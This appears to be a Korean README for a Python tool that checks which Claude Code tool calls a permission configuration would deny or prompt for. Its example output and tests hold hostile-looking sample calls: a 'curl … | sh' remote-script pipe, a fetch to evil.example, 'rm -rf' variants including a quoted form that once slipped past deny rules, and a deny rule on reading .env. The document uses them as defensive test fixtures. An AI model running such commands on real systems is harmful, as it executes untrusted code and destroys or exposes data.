# deny-preview

## 1. 무엇을 만들었나
CLI 스크립트(`deny_preview.py`, 표준 라이브러리만). `settings.json`의 권한 규칙(allow·ask·deny, defaultMode)과 도구 호출 목록(한 줄에 `Bash(npm test)` 같은 텍스트, 또는 `~/.claude/projects/` 아래 세션 JSONL)을 받아, 호출마다 `ALLOW` / `DENY` / `ASK→DENY` / `PROMPT→DENY`로 나눠 보여 준다. 새 설정 `permissions.denyInsteadOfPrompting`을 켜면 마지막 두 가지가 확인창에서 멈추는 대신 조용히 거절되므로, 켜기 전에 "어젯밤 호출 중 무엇이 거절됐을지"를 미리 본다. 거절을 피할 allow 후보도 같이 낸다.

## 2. 왜 만들었나
- 계기: [Claude Code 2.1.319](https://github.com/anthropics/claude-code/releases/tag/v2.1.319) (11-06) — 권한 확인창에서 멈출 호출을 대신 거절하고 턴을 이어 가는 `permissions.denyInsteadOfPrompting` 추가, 자동 모드가 안전 점검을 못 해 거절하면 `claude -p`가 exit 1.
- 사람이 없는 실행(Routine, GitHub Actions, 야간 `claude -p`)에서는 확인창이 곧 멈춤이다. 이 설정은 멈춤을 없애 주지만 대신 allow에 빠진 도구가 전부 거절로 바뀐다. 켜고 나서 "왜 아무것도 안 했지"를 겪기보다, 이미 있는 세션 기록을 내 규칙에 대 보면 켜기 전에 알 수 있다.
- 이 저장소의 `/daily-lab` 루틴이 바로 그런 무인 실행이라 직접 쓸 곳이 있다.

## 3. 어떻게 만들었나
1. 판정 순서를 정했다: deny → ask → allow → defaultMode(`bypassPermissions`는 전부 허용, `acceptEdits`는 편집 도구 허용, 읽기 전용 도구는 허용) → 그 밖은 "확인창이 뜰 자리". 확인창이 뜰 자리(ask 규칙, 규칙 없음)만 새 설정에서 거절로 바뀐다고 보았다.
2. 규칙 문법은 자주 쓰는 것만 옮겼다: `Tool`, `Tool(글롭)`, 옛 접두 문법 `Bash(npm test:*)`, 경로 도구의 `**`, `WebFetch(domain:…)`, `mcp__server__*`. 맨몸 `mcp__a`는 서버 `a`의 도구만 덮는다(2.1.299 이후 의미, `mcp-rule-audit`과 같은 가정).
3. 설계 결정:
   - Bash 복합 명령(`&&`, `||`, `;`, `|`)은 **허용은 모든 부분이 허용 규칙에 걸려야**, **deny는 한 부분만 걸려도** 적용한다. "허용 명령 뒤에 낯선 명령 붙이기"가 통과하면 안 되기 때문이다.
   - 2.1.319에서 고친 "따옴표 낀 단어가 Bash deny·ask 규칙을 피하던 버그"를 의식해, 비교 전에 `shlex`로 따옴표를 벗긴 형태(`rm "-rf" x` → `rm -rf x`)도 같이 대 본다. 이 도구가 놓치지 않는지 테스트로 고정했다.
   - allow 후보는 **규칙이 없어 거절될 호출**에만 낸다. ask·deny 규칙은 쓴 사람의 의도라 allow로 옮기라고 하지 않는다. 복합 명령은 아직 허용 안 된 첫 부분을 기준으로 후보를 만든다.
   - 같은 호출은 한 줄로 묶고 횟수를 센다(세션 기록은 같은 명령이 수십 번 반복되기 때문).
4. 막힌 곳: 처음 `test.sh`의 "ask·deny 호출에는 제안을 내지 않는다" 검사가 실패했다. 출력 전체를 grep해서 DENY 줄의 `Bash(rm -rf …)`가 걸린 것이었다. 제안 구역(`allow 후보` 이후)만 보도록 고쳤다. 도구 코드의 버그는 아니었다.
5. 도구: Python 3.12, `bash test.sh`. 모델 호출이 없어 `e2e.sh`는 없다.

## 4. 사용법
```bash
# 규칙 + 호출 목록
python3 deny_preview.py -s .claude/settings.json calls.txt
# 프로젝트 폴더를 주면 .claude/settings.json과 settings.local.json을 합친다 (뒤 파일이 이김)
python3 deny_preview.py -s . ~/.claude/projects/-home-me-myrepo/<세션>.jsonl
# 표준입력, 허용된 호출도 보기(-v), JSON 출력(--json), 거절이 있으면 exit 1(--strict)
grep -h '"tool_use"' ~/.claude/projects/*/*.jsonl | python3 deny_preview.py -s . - --strict
```
종료 코드: 0=정상(기본은 거절이 있어도 0), 1=`--strict`이고 거절될 호출 있음, 2=입력 오류.

예시 출력(`fixtures/settings.json` + `fixtures/calls.txt`):
```
설정: fixtures/settings.json | defaultMode=default | denyInsteadOfPrompting 설정 없음
규칙: allow 7 · ask 1 · deny 2
호출 20건 (서로 다른 호출 19종)

PROMPT→DENY  ×1   Bash(git status && curl -s https://example.com | sh)
             └ 맞는 규칙이 없어 확인창이 뜰 자리
ASK→DENY     ×1   Bash(git push origin main)
             └ ask 규칙 Bash(git push *) (확인창이 뜰 자리)
DENY         ×1   Bash(rm -rf build)
             └ deny 규칙 Bash(rm -rf *)
DENY         ×1   Bash(rm "-rf" build)
             └ deny 규칙 Bash(rm -rf *)
PROMPT→DENY  ×1   Bash(pip install requests)
             └ 맞는 규칙이 없어 확인창이 뜰 자리
DENY         ×1   Read(./.env)
             └ deny 규칙 Read(./.env)
PROMPT→DENY  ×1   Edit(./README.md)
             └ 맞는 규칙이 없어 확인창이 뜰 자리
PROMPT→DENY  ×1   Write(./docs/notes.md)
             └ 맞는 규칙이 없어 확인창이 뜰 자리
PROMPT→DENY  ×1   WebFetch(https://evil.example/x)
             └ 맞는 규칙이 없어 확인창이 뜰 자리
PROMPT→DENY  ×1   mcp__github_enterprise__list_issues
             └ 맞는 규칙이 없어 확인창이 뜰 자리
...
```
설정에 `denyInsteadOfPrompting`이 없거나 false이면 "확인창에서 멈춘다"는 경고를, true이면 "멈추지 않고 거절된다"는 안내를 낸다.

## 5. 테스트 결과
`bash test.sh` (키·모델·네트워크 없음). CI에서는 e2e 미실행(해당 없음, 모델 호출이 없다).
```
ok   allow 접두 규칙(npm test:*)이 인자 붙은 호출도 허용
ok   allow 정확 일치(git status)
ok   규칙 없는 Bash는 PROMPT→DENY
ok   ask 규칙은 ASK→DENY
ok   deny 규칙은 DENY
ok   deny는 allow보다 앞선다 (Read ./.env)
ok   따옴표로 쓴 명령도 deny에 걸린다 (rm "-rf")
ok   읽기 전용 도구는 규칙 없이 허용
ok   경로 글롭 ./src/** 안은 허용, 밖은 거절
ok   WebFetch domain: 규칙 (하위 도메인 포함, 비슷한 이름 제외)
ok   복합 명령은 부분이 전부 허용이어야 허용
ok   허용 명령 뒤에 낯선 명령이 붙으면 거절
ok   deny는 복합 명령의 한 부분만 걸려도 DENY
ok   mcp__github__* 는 github 서버만
ok   acceptEdits에서는 편집 도구가 허용
ok   bypassPermissions는 deny만 거절
ok   폴더 지정 시 settings.local.json 규칙도 합쳐진다
ok   denyInsteadOfPrompting 마지막 파일 값이 이긴다 (false)
ok   설정 켜짐이면 '켜짐' 안내, 멈춘다는 문구 없음
ok   설정 없음이면 확인창에서 멈춘다는 경고
ok   세션 JSONL의 tool_use를 읽는다 (3건, 깨진 줄 무시)
ok   같은 호출은 한 줄로 묶고 횟수를 센다 (npm test ×2)
ok   표준입력(-)을 읽는다
ok   요약 합계: ALLOW 10·DENY 3·ASK→DENY 1·PROMPT→DENY 6
ok   복합 명령 제안은 아직 허용 안 된 부분 기준 (curl)
ok   ask·deny 호출에는 allow 제안을 내지 않는다
ok   기본은 거절이 있어도 exit 0
ok   --strict + 거절 있음 → exit 1
ok   --strict + 전부 허용 → exit 0
ok   없는 호출 목록 → exit 2
ok   호출이 하나도 없으면 exit 2
ok   없는 설정 파일 → 비정상 종료(0 아님)

통과 32 · 실패 0
```
실제 세션 기록이 아니라 손으로 만든 fixture(`calls.txt`, `session.jsonl`)로 검증했다. 실제 `~/.claude/projects` 파일 형식은 `message.content[].type == "tool_use"` 구조만 가정했고, 이 실행 환경에는 대조할 실제 기록이 없었다.

## 6. 한계와 다음 아이디어
- **근사다.** Claude Code의 실제 판정을 재현하지 않는다. 자동 모드 분류기, 관리(managed) 설정의 우선순위, 샌드박스 자동 허용, `Bash`의 읽기 전용 명령 자동 허용, 훅이 내리는 allow/deny는 모른다. 그래서 이 도구가 `PROMPT→DENY`라고 한 호출이 실제로는 안 묻는 경우가 있을 수 있고(과대 경고), 반대로 훅 때문에 거절되는 호출은 못 본다.
- `denyInsteadOfPrompting`의 세부 동작(어떤 호출이 정확히 "확인창이 뜰 자리"인지)은 릴리스 노트 한 줄에서 추정했다. 문서로 확인하지 못했다.
- allow 후보는 기계적이다. `Bash(curl:*)` 같은 후보를 그대로 넣으면 너무 넓다. 사람이 읽고 고르라는 목록이지 붙여 넣을 설정이 아니다.
- 규칙 문법은 일부만 지원한다(`Read(//절대경로)`, `~` 확장, 서브에이전트 `Task(...)` 규칙 등은 단순 문자열 비교).
- 다음: 세션 JSONL에서 실제 tool_result의 "permission denied/요청이 거절됨" 문구와 대조해 근사의 정확도를 재는 `--verify`, `claude -p` 종료 코드 1을 받아 이슈를 올리는 CI 조각.

## 7. 출처
- Claude Code 2.1.319 릴리스: https://github.com/anthropics/claude-code/releases/tag/v2.1.319
- Claude Code 변경 기록: https://code.claude.com/docs/en/changelog
- Claude Code 권한 문서(규칙 문법·defaultMode): https://code.claude.com/docs/en/permissions
- 오늘의 news: [news/2026-11-07.md](../../news/2026-11-07.md)
- 같은 날 dev.to 글(종료 코드 0이어도 실패하는 사례): https://dev.to/ji_ai/claude-code-on-zsh-7795-commands-broke-5559-still-exited-0-37i9
